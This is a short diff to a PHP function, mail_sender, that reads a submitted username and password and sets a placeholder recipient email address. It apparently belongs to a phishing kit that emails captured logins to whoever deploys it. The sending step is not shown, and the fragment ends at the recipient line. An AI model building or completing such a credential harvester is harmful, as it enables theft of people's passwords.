@@ -1,7 +1,12 @@
 <?php
+
 	function mail_sender(){
-		$username = $_POST['username'];
-		$password = $_POST['password'];
+		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
+			return false;
+		}
+
+		$username = $_REQUEST['username'];
+		$password = $_REQUEST['password'];
 		
 		$reciever = "YOUR-EMAIL ADRRESS";
 		
